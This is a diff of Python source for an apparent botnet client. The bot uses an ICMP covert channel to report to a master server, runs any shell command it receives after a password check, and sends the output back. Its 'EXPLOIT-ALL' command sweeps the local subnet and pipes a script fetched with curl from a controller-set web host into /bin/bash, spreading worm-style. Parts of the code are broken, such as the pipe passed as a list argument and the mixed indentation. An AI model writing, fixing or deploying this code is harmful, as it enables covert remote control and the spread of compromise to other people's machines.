@@ -2,19 +2,26 @@ from icmp_tunnel import *
 import Queue
 import threading
 import os
+import subprocess
 
-MASTER = "10.0.0.1"
+MASTER = "10.80.100.20"
 DECRYPTION_KEY = "pass123"
 PASSWORD = "OkayNowYouCanUseMe"
 WEB = "www.ILoveRed.com"
 cmdQueue = Queue.Queue()
 
 class Handler(threading.Thread):
-    def __init__(self, q):
-        self.q = q
-        threading.Thread.__init__(self)
+    def __init__(self, master, key, passwd, web, q):
+      	self.master = master
+	self.key = key
+	self.passwd = passwd
+	self.web = web
+	self.q = q
+
+	threading.Thread.__init__(self)
 
     def run(self):
+	print("Listening...")
         while True:
             if not self.q.empty():
                 #BUILT IN CMD FORMAT IS AS FOLLOWS
@@ -22,43 +29,45 @@ class Handler(threading.Thread):
                 #OTHERWISE COMMANDS WILL JUST BE EXECUTED AND THEIR OUTPUT RETURNED
 	
 		raw = self.q.get()
-
-		if PASSWORD in raw:	#Is this legit data?
+		print(raw)
+		if self.passwd in raw:	#Is this legit data?
 			if "----->" in raw:	#Is this a builtin?
-				builtin = raw.strip(PASSWORD).split("----->")
+				builtin = raw.strip(self.passwd).split("----->")
 				if builtin[0] == "SET-MASTER":
-					MASTER = builtin[1]
+					self.master = builtin[1]
 				elif builtin[0] == "SET-KEY":
-					DECRYPTION_KEY = builtin[1]
+					self.key = builtin[1]
 				elif builtin[0] == "SET-PASS":
-					PASSWORD = builtin[1]
+					self.passwd = builtin[1]
 				elif builtin[0] == "SET-WEB":
-					WEB = builtin[1]
+					self.web = builtin[1]
 				elif builtin[0] == "RESET-EMERGENCY-OMG":
-					PASSWORD = "DEFAULT-HARDCODED"
-					DECRYPTION = "DEFAULT-DENCRYPT"
-					WEB = "www.DEFAULT.com"
+					self.passwd = "DEFAULT-HARDCODED"
+					self.key = "DEFAULT-DENCRYPT"
+					self.web = "www.DEFAULT.com"
 				elif builtin[0] == "EXPLOIT-ALL":
-					plague()		
+					octets = localhost.split(".")
+					for i in range(1,253):
+						if i != octets[3]:
+							out = subprocess.check_output("curl", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i), "|","/bin/bash")
+							send_icmp(localhost, self.master, "EXPLOIT-OUTPUT"+out)
+						
 			else:
-				cmd = raw.strip(PASSWORD).split()
-				out = subprocess.check_output(cmd)
-				send_icmp(localhost, MASTER, "OUTPUT")
+				print self.passwd
+				cmd = raw[len(self.passwd):]
+				print("RECEIVED: "+cmd)
+				out = subprocess.check_output(cmd.split())
+				print("OUT: "+str(out))
+				send_icmp(localhost, self.master, "OUTPUT")
 
 def init():
 	print("Bot started...["+localhost+"]")
 	send_icmp(localhost, MASTER, "NEW-BOT-INIT:"+localhost)
-def plague():
-	octets = localhost.split(".")
-	for i in range(1,253):
-		if i != octets[3]:
-			out = subprocess.check_output("curl", WEB ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i), "|","/bin/bash")
-			send_icmp(localhost, MASTER, "EXPLOIT-OUTPUT"+out)
 
 def main():
 	init()
 	listener = Listener(cmdQueue)
-    	handler = Handler(cmdQueue)
+    	handler = Handler(MASTER, DECRYPTION_KEY, PASSWORD, WEB, cmdQueue)
     	listener.start()
     	handler.start()
 main()
